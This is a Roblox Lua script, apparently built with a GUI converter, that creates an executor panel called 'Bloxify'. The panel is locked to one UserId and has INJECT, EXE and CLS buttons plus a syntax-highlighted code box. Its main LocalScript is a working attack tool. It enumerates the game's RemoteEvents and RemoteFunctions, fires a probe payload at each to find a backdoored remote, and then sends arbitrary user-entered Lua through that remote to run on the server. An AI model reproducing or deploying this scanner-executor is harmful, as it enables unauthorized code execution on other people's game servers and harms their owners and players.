--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 17 | Scripts: 5 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.blox-ify
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[blox-ify]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.blox-ify.LocalScript
G2L["2"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.blox-ify.main
G2L["3"] = Instance.new("Frame", G2L["1"]);
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(78, 78, 78);
G2L["3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["3"]["Style"] = Enum.FrameStyle.RobloxRound;
G2L["3"]["Size"] = UDim2.new(0, 682, 0, 380);
G2L["3"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["3"]["Name"] = [[main]];


-- StarterGui.blox-ify.main.Header
G2L["4"] = Instance.new("TextLabel", G2L["3"]);
G2L["4"]["TextStrokeTransparency"] = 0.8;
G2L["4"]["TextSize"] = 24;
G2L["4"]["TextStrokeColor3"] = Color3.fromRGB(0, 129, 0);
G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["BackgroundTransparency"] = 1;
G2L["4"]["Size"] = UDim2.new(1, 0, 0, 30);
G2L["4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["4"]["Text"] = [[Bloxify]];
G2L["4"]["Name"] = [[Header]];


-- StarterGui.blox-ify.main.Close
G2L["5"] = Instance.new("TextButton", G2L["3"]);
G2L["5"]["Modal"] = true;
G2L["5"]["TextSize"] = 18;
G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["Size"] = UDim2.new(0.06406, 0, 0, 40);
G2L["5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["5"]["Text"] = [[X]];
G2L["5"]["Name"] = [[Close]];
G2L["5"]["Style"] = Enum.ButtonStyle.RobloxButtonDefault;
G2L["5"]["Position"] = UDim2.new(0.9362, 0, 0.09934, -40);


-- StarterGui.blox-ify.main.Close.LocalScript
G2L["6"] = Instance.new("LocalScript", G2L["5"]);



-- StarterGui.blox-ify.main.main
G2L["7"] = Instance.new("Frame", G2L["3"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Name"] = [[main]];
G2L["7"]["BackgroundTransparency"] = 1;


-- StarterGui.blox-ify.main.main.code
G2L["8"] = Instance.new("ScrollingFrame", G2L["7"]);
G2L["8"]["Active"] = true;
G2L["8"]["BorderSizePixel"] = 2;
G2L["8"]["TopImage"] = [[rbxassetid://16376858572]];
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(71, 71, 71);
G2L["8"]["Name"] = [[code]];
G2L["8"]["BottomImage"] = [[rbxassetid://16376862656]];
G2L["8"]["Size"] = UDim2.new(0, 323, 0, 192);
G2L["8"]["Position"] = UDim2.new(0.01773, 0, 0.10322, 0);
G2L["8"]["BorderColor3"] = Color3.fromRGB(60, 60, 60);


-- StarterGui.blox-ify.main.main.code.TextBox
G2L["9"] = Instance.new("TextBox", G2L["8"]);
G2L["9"]["CursorPosition"] = -1;
G2L["9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["TextWrapped"] = true;
G2L["9"]["TextSize"] = 14;
G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["9"]["MultiLine"] = true;
G2L["9"]["ClearTextOnFocus"] = false;
G2L["9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[--hi]];
G2L["9"]["BackgroundTransparency"] = 1;


-- StarterGui.blox-ify.main.main.code.TextBox.LocalScript
G2L["a"] = Instance.new("LocalScript", G2L["9"]);



-- StarterGui.blox-ify.main.main.code.TextLabel
G2L["b"] = Instance.new("TextLabel", G2L["8"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 14;
G2L["b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["b"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["RichText"] = true;
G2L["b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[--hi]];


-- StarterGui.blox-ify.main.main.exe
G2L["c"] = Instance.new("TextButton", G2L["7"]);
G2L["c"]["Modal"] = true;
G2L["c"]["TextSize"] = 56;
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["Size"] = UDim2.new(0.2073, 0, 0.0566, 40);
G2L["c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c"]["Text"] = [[EXE]];
G2L["c"]["Name"] = [[exe]];
G2L["c"]["Style"] = Enum.ButtonStyle.RobloxButtonDefault;
G2L["c"]["Position"] = UDim2.new(0.52279, 0, 0.21077, -40);


-- StarterGui.blox-ify.main.main.cls
G2L["d"] = Instance.new("TextButton", G2L["7"]);
G2L["d"]["Modal"] = true;
G2L["d"]["TextSize"] = 56;
G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d"]["Size"] = UDim2.new(0.2073, 0, 0.0566, 40);
G2L["d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d"]["Text"] = [[CLS]];
G2L["d"]["Name"] = [[cls]];
G2L["d"]["Style"] = Enum.ButtonStyle.RobloxButtonDefault;
G2L["d"]["Position"] = UDim2.new(0.76911, 0, 0.21077, -40);


-- StarterGui.blox-ify.main.main.inj
G2L["e"] = Instance.new("TextButton", G2L["7"]);
G2L["e"]["Modal"] = true;
G2L["e"]["TextSize"] = 56;
G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["Size"] = UDim2.new(0.45362, 0, 0.0566, 40);
G2L["e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["e"]["Text"] = [[INJECT]];
G2L["e"]["Name"] = [[inj]];
G2L["e"]["Style"] = Enum.ButtonStyle.RobloxButtonDefault;
G2L["e"]["Position"] = UDim2.new(0.52279, 0, 0.42287, -40);


-- StarterGui.blox-ify.main.main.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["7"]);



-- StarterGui.blox-ify.Open
G2L["10"] = Instance.new("TextButton", G2L["1"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["Modal"] = true;
G2L["10"]["TextSize"] = 18;
G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["10"]["Size"] = UDim2.new(0.11662, 0, -0.00728, 40);
G2L["10"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["10"]["Text"] = [[Bloxify]];
G2L["10"]["Name"] = [[Open]];
G2L["10"]["Visible"] = false;
G2L["10"]["Style"] = Enum.ButtonStyle.RobloxButtonDefault;
G2L["10"]["Position"] = UDim2.new(0, 20, 0.43631, 0);


-- StarterGui.blox-ify.Open.LocalScript
G2L["11"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.blox-ify.LocalScript
local function C_2()
local script = G2L["2"];
	local devsID={
		8441275335;
		
	}
	
	for _, a in ipairs(devsID) do
		if game.Players.LocalPlayer.UserId==a then
			script.Parent.Enabled=true
		else
			script.Parent:Destroy()
		end
	end
end;
task.spawn(C_2);
-- StarterGui.blox-ify.main.Close.LocalScript
local function C_6()
local script = G2L["6"];
	script.Parent.MouseButton1Click:Connect(function()
		local frame = script.Parent.Parent
		for _, v in pairs(frame:GetDescendants()) do
			if v:IsA('GuiObject') then
				v.Visible = false
			end
		end
		local tween= game:GetService('TweenService'):Create(frame, TweenInfo.new(1.5), {
			Size = UDim2.new(0, 0, 0, 0),
			Position = UDim2.new(0.5, 0, 0.5, 0)
		})
		tween:Play()
		tween.Completed:Connect(function(playbackState: Enum.PlaybackState) 
			script.Parent.Parent.Parent.Open	.Visible=true
		end)
	end)
end;
task.spawn(C_6);
-- StarterGui.blox-ify.main.main.code.TextBox.LocalScript
local function C_a()
local script = G2L["a"];
	local highlighter = {}
	local keywords = {
		lua = {
			"and", "break", "or", "else", "elseif", "if", "then", "until", "repeat", "while", "do", "for", "in", "end",
			"local", "return", "function", "export"
		},
		rbx = {
			"game", "workspace", "script", "math", "string", "table", "task", "wait", "select", "next", "Enum",
			"error", "warn", "tick", "assert", "shared", "loadstring", "tonumber", "tostring", "type",
			"typeof", "unpack", "print", "Instance", "CFrame", "Vector3", "Vector2", "Color3", "UDim", "UDim2", "Ray", "BrickColor",
			"OverlapParams", "RaycastParams", "Axes", "Random", "Region3", "Rect", "TweenInfo",
			"collectgarbage", "not", "utf8", "pcall", "xpcall", "_G", "setmetatable", "getmetatable", "os", "pairs", "ipairs"
		},
		operators = {
			"#", "+", "-", "*", "%", "/", "^", "=", "~", "=", "<", ">", ",", ".", "(", ")", "{", "}", "[", "]", ";", ":"
		}
	}
	
	local colors = {
		numbers = Color3.fromRGB(255, 198, 0),
		boolean = Color3.fromRGB(214, 128, 23),
		operator = Color3.fromRGB(232, 210, 40),
		lua = Color3.fromRGB(160, 87, 248),
		rbx = Color3.fromRGB(146, 180, 253),
		str = Color3.fromRGB(56, 241, 87),
		comment = Color3.fromRGB(103, 110, 149),
		null = Color3.fromRGB(79, 79, 79),
		call = Color3.fromRGB(130, 170, 255),
		self_call = Color3.fromRGB(227, 201, 141),
		local_color = Color3.fromRGB(199, 146, 234),
		function_color = Color3.fromRGB(241, 122, 124),
		self_color = Color3.fromRGB(146, 134, 234),
		local_property = Color3.fromRGB(129, 222, 255),
	}
	
	local function createKeywordSet(keywords)
		local keywordSet = {}
		for _, keyword in ipairs(keywords) do
			keywordSet[keyword] = true
		end
		return keywordSet
	end
	
	local luaSet = createKeywordSet(keywords.lua)
	local rbxSet = createKeywordSet(keywords.rbx)
	local operatorsSet = createKeywordSet(keywords.operators)
	
	local function getHighlight(tokens, index)
		local token = tokens[index]
	
		if colors[token .. "_color"] then
			return colors[token .. "_color"]
		end
	
		if tonumber(token) then
			return colors.numbers
		elseif token == "nil" then
			return colors.null
		elseif token:sub(1, 2) == "--" then
			return colors.comment
		elseif operatorsSet[token] then
			return colors.operator
		elseif luaSet[token] then
			return colors.rbx
		elseif rbxSet[token] then
			return colors.lua
		elseif token:sub(1, 1) == "\"" or token:sub(1, 1) == "\'" then
			return colors.str
		elseif token == "true" or token == "false" then
			return colors.boolean
		end
	
		if tokens[index + 1] == "(" then
			if tokens[index - 1] == ":" then
				return colors.self_call
			end
	
			return colors.call
		end
	
		if tokens[index - 1] == "." then
			if tokens[index - 2] == "Enum" then
				return colors.rbx
			end
	
			return colors.local_property
		end
	end
	
	function highlighter.run(source)
		local tokens = {}
		local currentToken = ""
	
		local inString = false
		local inComment = false
		local commentPersist = false
	
		for i = 1, #source do
			local character = source:sub(i, i)
	
			if inComment then
				if character == "\n" and not commentPersist then
					table.insert(tokens, currentToken)
					table.insert(tokens, character)
					currentToken = ""
	
					inComment = false
				elseif source:sub(i - 1, i) == "]]" and commentPersist then
					currentToken ..= "]"
	
					table.insert(tokens, currentToken)
					currentToken = ""
	
					inComment = false
					commentPersist = false
				else
					currentToken = currentToken .. character
				end
			elseif inString then
				if character == inString and source:sub(i-1, i-1) ~= "\\" or character == "\n" then
					currentToken = currentToken .. character
					inString = false
				else
					currentToken = currentToken .. character
				end
			else
				if source:sub(i, i + 1) == "--" then
					table.insert(tokens, currentToken)
					currentToken = "-"
					inComment = true
					commentPersist = source:sub(i + 2, i + 3) == "[["
				elseif character == "\"" or character == "\'" then
					table.insert(tokens, currentToken)
					currentToken = character
					inString = character
				elseif operatorsSet[character] then
					table.insert(tokens, currentToken)
					table.insert(tokens, character)
					currentToken = ""
				elseif character:match("[%w_]") then
					currentToken = currentToken .. character
				else
					table.insert(tokens, currentToken)
					table.insert(tokens, character)
					currentToken = ""
				end
			end
		end
	
		table.insert(tokens, currentToken)
	
		local highlighted = {}
	
		for i, token in ipairs(tokens) do
			local highlight = getHighlight(tokens, i)
	
			if highlight then
				local syntax = string.format("<font color = \"#%s\">%s</font>", highlight:ToHex(), token:gsub("<", "&lt;"):gsub(">", "&gt;"))
	
				table.insert(highlighted, syntax)
			else
				table.insert(highlighted, token)
			end
		end
	
		return table.concat(highlighted)
	end
	
	script.Parent.Changed:Connect(function()
		script.Parent.Parent.TextLabel.Text=highlighter.run(script.Parent.Text)
	end)
end;
task.spawn(C_a);
-- StarterGui.blox-ify.main.main.LocalScript
local function C_f()
local script = G2L["f"];
	local print=function(...)
		return print('[Bloxify-LOG]> '.. ...)
	end
	
	local warn=function(...)
		return warn('[Bloxify-WRN]: ' .. ...)
	end
	
	local backdoorvar2=nil
	
	local function scan():Instance
		local backdoor=nil
		print('Scan Function Initalized.')
		local RRS=game:GetService('RobloxReplicatedStorage')
		local safes={
			RRS;
			game.DefaultChatSystemChatEvents;
		}
		if game.ReplicatedStorage:FindFirstChild('HDAdminClient') then
			table.insert(safes,game.ReplicatedStorage.HDAdminClient)
		end
		local remotes={}
		for _, v in pairs(game:GetDescendants()) do
			for _, safe in ipairs(safes) do
				if v:IsDescendantOf(safe) then continue else
					if v:IsA('RemoteEvent') or v:IsA('RemoteFunction') then
						table.insert(remotes,v)
						warn('Possible Vulnerable Remote: ' .. v.Name)
					end
				end
			end
		end
		for _, r in pairs(remotes) do
			local backdoorAttemptFireVulnerableReal=workspace:FindFirstChild('_FeBy1-funcIDK83939393')~=nil
			local payload='local _c=Instance.new("Highlight"); _c.Name="_FeBy1-funcIDK83939393"; _c.Parent=workspace'
			if r:IsA('RemoteEvent') then
				r:FireServer(payload)
				print('Fired Remote "' .. r.Name..'" To see if Vulnerable..')
				if backdoorAttemptFireVulnerableReal then
					print('Found vulnerable remote!: ' .. r.Name)
					backdoor=r
					break
				else
					print('Not vulnerable.')
				end
			elseif r:IsA('RemoteFunction') then
				r:InvokeServer(payload)
				print('Fired Remote "' .. r.Name..'" To see if Vulnerable..')
				if backdoorAttemptFireVulnerableReal then
					print('Found vulnerable remote!: ' .. r.Name)
					backdoor=r
					break
				else
					print('Not vulnerable.')
				end
			end
		end
		return backdoor
	end
	
	script.Parent.inj.MouseButton1Click:Connect(function()
		local backdoor=scan()
		if backdoor~=nil then
			backdoorvar2=backdoor
		else
			warn('No backdoor found.')
		end
	end)
	
	script.Parent.exe.MouseButton1Click:Connect(function()
		if backdoorvar2~=nil then
			if backdoorvar2:IsA('RemoteEvent') then
				backdoorvar2:FireServer(script.Parent.code.TextBox.Text)
			elseif backdoorvar2:IsA('RemoteFunction') then
				backdoorvar2:InvokeServer(script.Parent.code.TextBox.Text)
			end
		else
			warn('No backdoor found.')
		end
	end)
	
	script.Parent.cls.MouseButton1Click:Connect(function()
		script.Parent.code.TextBox.Text=''
	end)
end;
task.spawn(C_f);
-- StarterGui.blox-ify.Open.LocalScript
local function C_11()
local script = G2L["11"];
	script.Parent.MouseButton1Click:Connect(function()
		local frame = script.Parent.Parent.main
		
		local tween=game:GetService('TweenService'):Create(frame, TweenInfo.new(1.5), {
			Size = UDim2.new(0, 682,0, 380),
			Position = UDim2.new(0.5, 0, 0.5, 0)
		})
		
		tween:Play()
		tween.Completed:Connect(function()
			for _, v in pairs(frame:GetDescendants()) do
				if v:IsA('GuiObject') then
					v.Visible = true
				end
			end
			script.Parent.Visible=false
		end)
	end)
end;
task.spawn(C_11);

return G2L["1"], require;
